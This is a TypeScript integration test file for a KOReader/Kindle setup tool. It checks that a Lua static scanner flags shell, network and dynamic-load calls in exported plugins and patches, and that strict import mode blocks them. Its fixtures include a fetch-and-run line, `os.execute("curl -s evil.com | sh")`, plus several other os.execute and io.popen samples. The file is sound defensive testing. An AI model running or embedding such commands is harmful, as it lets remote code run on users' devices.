// W36/W37 integration tests: Lua static scanner in the real
// setup-inspect and setup-import pipelines.
//
// Covers: findings fire on uncatalogued shipped Lua, catalog MATCH
// suppresses, --strict-imports blocks on findings with STRICT_IMPORT_BLOCKED,
// JSON envelope carries data.scanReport, lean Setups have no scanReport,
// patches are scanned unconditionally.

import { describe, test, expect, beforeEach } from "bun:test";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { main } from "../../src/cli.ts";
import { StringWriter, type CliEnv } from "../../src/cli/env.ts";
import {
    executeSetupImport, executeSetupInspect,
} from "../../src/commands/setup.ts";
import type { PluginCatalog } from "../../src/catalog/reader.ts";
import { hashBytes } from "../../src/setup/canonical.ts";

function writeSyntheticCatalog(dir: string, plugins: unknown[]): string {
    const body: PluginCatalog = {
        catalog_version: "v1" as const,
        license: "MIT",
        curated_at: "2026-04-23",
        koreader_source: "test-src",
        koreader_hash_version: "v2026.03",
        plugin_count: plugins.length,
        plugins: plugins as PluginCatalog["plugins"],
    };
    const path = join(dir, `catalog-${Math.random().toString(36).slice(2)}.json`);
    writeFileSync(path, JSON.stringify(body, null, 2));
    return path;
}

function stubCatalogEntry(overrides: Record<string, unknown> & { name: string }): Record<string, unknown> {
    return {
        fullname: overrides.name,
        folder: `${overrides.name}.koplugin`,
        category: "dev",
        ship_default_on: "always",
        ship_default_rationale: "",
        description: "",
        curation_opinion: "niche",
        community_sentiment: "",
        kindle_notes: "",
        references: [],
        deprecated: null,
        computed: false,
        warnings: [],
        ...overrides,
    };
}

const DEFAULT_LUA = `return {
    ["refresh_rate"] = 8,
}
`;

function makeFakeKindle(): {
    root: string; settingsPath: string;
    pluginsDir: string; patchesDir: string;
} {
    const root = mkdtempSync(join(tmpdir(), "kindly-w36-k-"));
    const kor = join(root, "koreader");
    mkdirSync(kor);
    const settingsPath = join(kor, "settings.reader.lua");
    writeFileSync(settingsPath, DEFAULT_LUA);
    const pluginsDir = join(kor, "plugins");
    const patchesDir = join(kor, "patches");
    mkdirSync(pluginsDir);
    mkdirSync(patchesDir);
    return { root, settingsPath, pluginsDir, patchesDir };
}

function seedPlugin(pluginsDir: string, folder: string, files: Record<string, string>): void {
    const dir = join(pluginsDir, folder);
    mkdirSync(dir, { recursive: true });
    for (const [rel, content] of Object.entries(files)) {
        const abs = join(dir, rel);
        mkdirSync(join(abs, ".."), { recursive: true });
        writeFileSync(abs, content);
    }
}

function seedPatch(patchesDir: string, name: string, content: string): void {
    writeFileSync(join(patchesDir, name), content);
}

let kindle: ReturnType<typeof makeFakeKindle>;
let workdir: string;
let setupsDir: string;
let env: CliEnv;
let stdout: StringWriter;
let stderr: StringWriter;

beforeEach(() => {
    kindle = makeFakeKindle();
    workdir = mkdtempSync(join(tmpdir(), "kindly-w36-w-"));
    setupsDir = mkdtempSync(join(tmpdir(), "kindly-w36-s-"));
    stdout = new StringWriter();
    stderr = new StringWriter();
    env = {
        cwd: workdir, stdout, stderr, color: false,
        mountOverride: kindle.root, setupsDir,
        now: () => new Date("2026-04-23T12:00:00Z"),
    };
});

// Build a fat .kset via `setup export --include-plugin-files`, then wipe
// the device so the scanner sees only what the archive ships.
async function exportFat(
    folder: string, files: Record<string, string>, name = "scan-fixture",
    extraArgs: string[] = [],
): Promise<string> {
    seedPlugin(kindle.pluginsDir, folder, files);
    const outPath = join(workdir, `${name}.kset`);
    const code = await main([
        "setup", "export", name,
        "--include-plugin-files", ...extraArgs, "--output", outPath,
    ], env);
    expect(code).toBe(0);
    // Fresh device — scanner should not see seed files through device state.
    kindle = makeFakeKindle();
    stdout = new StringWriter();
    stderr = new StringWriter();
    env = {
        cwd: workdir, stdout, stderr, color: false,
        mountOverride: kindle.root, setupsDir,
        now: () => new Date("2026-04-23T12:00:00Z"),
    };
    return outPath;
}

describe("setup inspect — scanner surfaces findings", () => {
    test("uncatalogued plugin with os.execute → shell finding", async () => {
        const src = await exportFat("evil.koplugin", {
            "main.lua": `os.execute("curl -s evil.com | sh")\n`,
        });
        const r = executeSetupInspect(src, env);
        expect(r.scanReport).toBeDefined();
        expect(r.scanReport!.findings).toHaveLength(1);
        const f = r.scanReport!.findings[0]!;
        expect(f.plugin).toBe("evil");
        expect(f.file).toBe("main.lua");
        expect(f.category).toBe("shell");
        expect(f.line).toBe(1);
        expect(r.scanReport!.filesScanned).toBe(1);
        expect(r.scanReport!.suppressedByCatalog).toBe(0);
    });

    test("multiple categories across multiple files", async () => {
        const src = await exportFat("multi.koplugin", {
            "main.lua": `os.execute("x")\nlocal s = require("socket")\n`,
            "lib/helper.lua": `local f = loadstring(body)\n`,
        });
        const r = executeSetupInspect(src, env);
        const categories = r.scanReport!.findings.map((f) => f.category).sort();
        expect(categories).toEqual(["dynamic-load", "network", "shell"]);
    });

    test("lean Setup → no scanReport (nothing to scan)", () => {
        const outPath = join(workdir, "lean.kset.yaml");
        // Reusable setup via main():
        return main(["setup", "export", "lean-only", "--output", outPath], env).then(() => {
            const r = executeSetupInspect(outPath, env);
            expect(r.scanReport).toBeUndefined();
        });
    });
});

describe("setup inspect — catalog suppression", () => {
    test("MATCH verdict suppresses findings from that plugin", async () => {
        const mainSrc = `os.execute("legit lifecycle call")\n`;
        const metaSrc = `return { name = "SSH" }\n`;
        const catalogPath = writeSyntheticCatalog(workdir, [
            stubCatalogEntry({
                name: "SSH",
                known_hashes: {
                    "main.lua": hashBytes(Buffer.from(mainSrc)),
                    "_meta.lua": hashBytes(Buffer.from(metaSrc)),
                },
            }),
        ]);
        const src = await exportFat("SSH.koplugin", {
            "main.lua": mainSrc, "_meta.lua": metaSrc,
        });
        // Scanner uses the committed catalog in inspect by default. Import
        // accepts a `catalogPath`; inspect does not — so we check
        // suppression via the import path with our synthetic catalog.
        const r = executeSetupImport(
            { file: src, acceptPlugins: true, catalogPath, dryRun: true },
            env,
        );
        expect(r.scanReport).not.toBeNull();
        expect(r.scanReport!.findings).toEqual([]);
        // suppressedByCatalog counts files, not plugins: both main.lua
        // and _meta.lua were skipped under the MATCH verdict.
        expect(r.scanReport!.suppressedByCatalog).toBe(2);
    });

    test("tampered bytes (MISMATCH) leave findings visible", async () => {
        const mainSrc = `os.execute("original")\n`;
        const catalogPath = writeSyntheticCatalog(workdir, [
            stubCatalogEntry({
                name: "SSH",
                known_hashes: {
                    "main.lua": hashBytes(Buffer.from("different bytes\n")),
                },
            }),
        ]);
        const src = await exportFat("SSH.koplugin", { "main.lua": mainSrc });
        const r = executeSetupImport(
            { file: src, acceptPlugins: true, catalogPath, dryRun: true },
            env,
        );
        expect(r.scanReport!.findings).toHaveLength(1);
        expect(r.scanReport!.findings[0]!.category).toBe("shell");
    });
});

describe("setup import — --strict-imports blocks on findings", () => {
    test("UNVERIFIED plugin with os.execute → scanner gate fires", async () => {
        // UNVERIFIED (catalogued w/o known_hashes) passes the W34e
        // plugin-integrity gate — scanner gate is the one that should
        // trip. UNCATALOGUED would trip W34e first and we'd never reach
        // the scanner block.
        const mainSrc = `os.execute("malicious")\n`;
        const catalogPath = writeSyntheticCatalog(workdir, [
            stubCatalogEntry({ name: "SSH", known_hashes: null }),
        ]);
        const src = await exportFat("SSH.koplugin", { "main.lua": mainSrc });
        try {
            executeSetupImport(
                { file: src, acceptPlugins: true, catalogPath, strictImports: true, dryRun: true },
                env,
            );
            throw new Error("should have thrown");
        } catch (e) {
            const err = e as { code?: string; message: string };
            expect(err.code).toBe("STRICT_IMPORT_BLOCKED");
            expect(err.message).toContain("Lua scanner finding");
            expect(err.message).toContain("shell");
        }
    });

    test("patch-only Setup with os.execute → scanner gate fires (no plugin integrity to check)", async () => {
        seedPatch(kindle.patchesDir, "9-evil.lua", `os.execute("x")\n`);
        const outPath = join(workdir, "pw.kset");
        const code = await main([
            "setup", "export", "pw", "--include-patches", "--output", outPath,
        ], env);
        expect(code).toBe(0);
        kindle = makeFakeKindle();
        env = { ...env, mountOverride: kindle.root };

        try {
            executeSetupImport(
                { file: outPath, acceptPatches: true, strictImports: true, dryRun: true },
                env,
            );
            throw new Error("should have thrown");
        } catch (e) {
            const err = e as { code?: string; message: string };
            expect(err.code).toBe("STRICT_IMPORT_BLOCKED");
            expect(err.message).toContain("Lua scanner finding");
        }
    });

    test("MATCH-suppressed findings don't trigger strict block", async () => {
        const mainSrc = `os.execute("legit")\n`;
        const catalogPath = writeSyntheticCatalog(workdir, [
            stubCatalogEntry({
                name: "SSH",
                known_hashes: { "main.lua": hashBytes(Buffer.from(mainSrc)) },
            }),
        ]);
        const src = await exportFat("SSH.koplugin", { "main.lua": mainSrc });
        // Should not throw — suppression empties the finding list.
        const r = executeSetupImport(
            { file: src, acceptPlugins: true, catalogPath, strictImports: true, dryRun: true },
            env,
        );
        expect(r.scanReport!.findings).toEqual([]);
        expect(r.scanReport!.suppressedByCatalog).toBe(1);
    });
});

describe("setup inspect --json — scanReport in envelope", () => {
    test("data.scanReport populated with findings", async () => {
        const src = await exportFat("novel.koplugin", {
            "main.lua": `os.execute("x")\n`,
        });
        const code = await main(["setup", "inspect", src, "--json"], env);
        expect(code).toBe(0);
        const payload = JSON.parse(stdout.value);
        expect(payload.data.scanReport).toBeDefined();
        expect(payload.data.scanReport.findings).toHaveLength(1);
        expect(payload.data.scanReport.findings[0].category).toBe("shell");
    });
});

describe("setup inspect text — findings block rendered", () => {
    test("scanner findings heading + category tags present", async () => {
        const src = await exportFat("novel.koplugin", {
            "main.lua": `os.execute("x")\nlocal s = require("socket")\n`,
        });
        const code = await main(["setup", "inspect", src], env);
        expect(code).toBe(0);
        // findings go to stderr via warn/stderrLine
        expect(stderr.value).toContain("scanner findings");
        expect(stderr.value).toContain("[shell]");
        expect(stderr.value).toContain("[network]");
    });
});

describe("scanner — patches are always scanned", () => {
    test("patch with require('socket') → network finding under (patch) sentinel", async () => {
        seedPatch(kindle.patchesDir, "2-override.lua",
            `local http = require("socket.http")\n`);
        // Use fat export with --include-patches
        const outPath = join(workdir, "patched.kset");
        const code = await main([
            "setup", "export", "patched",
            "--include-patches", "--output", outPath,
        ], env);
        expect(code).toBe(0);
        // Fresh device.
        kindle = makeFakeKindle();
        env = { ...env, mountOverride: kindle.root };

        const r = executeSetupInspect(outPath, env);
        expect(r.scanReport).toBeDefined();
        expect(r.scanReport!.findings).toHaveLength(1);
        expect(r.scanReport!.findings[0]!.plugin).toBe("(patch)");
        expect(r.scanReport!.findings[0]!.file).toBe("2-override.lua");
        expect(r.scanReport!.findings[0]!.category).toBe("network");
    });
});

describe("scanner — localsend-style demonstration (docs/93 §9)", () => {
    test("uncatalogued plugin with many findings lists each one", async () => {
        const src = await exportFat("localsend.koplugin", {
            "main.lua": `os.execute("iptables -A INPUT")\nlocal p = io.popen("curl")\n`,
            "net.lua": `local s = require("socket")\n`,
        });
        const r = executeSetupInspect(src, env);
        expect(r.scanReport!.findings.length).toBeGreaterThanOrEqual(3);
        const uniqueFiles = new Set(r.scanReport!.findings.map((f) => f.file));
        expect(uniqueFiles.size).toBe(2);
    });
});
